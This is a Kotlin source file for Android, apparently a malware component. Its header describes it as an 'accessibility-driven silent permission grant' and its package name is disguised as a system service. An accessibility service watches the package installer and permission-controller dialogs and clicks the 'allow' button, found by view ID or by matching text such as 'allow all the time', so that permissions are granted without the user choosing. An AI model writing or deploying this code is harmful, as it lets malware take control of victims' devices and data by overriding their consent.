// [context: Kotlin, Android API 26+, accessibility-driven silent permission grant]
package com.system.service.persistence

import android.accessibilityservice.AccessibilityService
import android.content.Context
import android.content.pm.PackageManager
import android.os.Build
import android.view.accessibility.AccessibilityEvent
import android.view.accessibility.AccessibilityNodeInfo

class AutoPermission(private val service: AccessibilityService) {

    private val pendingGrants = mutableListOf<String>()

    fun queuePermission(permission: String) {
        pendingGrants.add(permission)
    }

    fun handleEvent(event: AccessibilityEvent) {
        if (event.packageName != "com.android.packageinstaller" &&
            event.packageName != "com.google.android.packageinstaller" &&
            event.packageName != "com.android.permissioncontroller") return

        val root = service.rootInActiveWindow ?: return
        acceptPermissionDialog(root)
    }

    private fun acceptPermissionDialog(root: AccessibilityNodeInfo) {
        val allowButtons = listOf(
            "com.android.permissioncontroller:id/permission_allow_button",
            "com.android.packageinstaller:id/permission_allow_button",
            "android:id/button1"
        )
        for (resId in allowButtons) {
            val nodes = root.findAccessibilityNodeInfosByViewId(resId)
            if (nodes.isNotEmpty()) {
                nodes[0].performAction(AccessibilityNodeInfo.ACTION_CLICK)
                return
            }
        }
        // fallback: text match
        val textMatches = listOf("allow", "allow all the time", "ok", "yes", "accept")
        traverseAndClick(root, textMatches)
    }

    private fun traverseAndClick(node: AccessibilityNodeInfo, targets: List<String>): Boolean {
        val text = node.text?.toString()?.lowercase()
        if (text != null && targets.any { text.contains(it) } && node.isClickable) {
            node.performAction(AccessibilityNodeInfo.ACTION_CLICK)
            return true
        }
        for (i in 0 until node.childCount) {
            val child = node.getChild(i) ?: continue
            if (traverseAndClick(child, targets)) return true
        }
        return false
    }
}
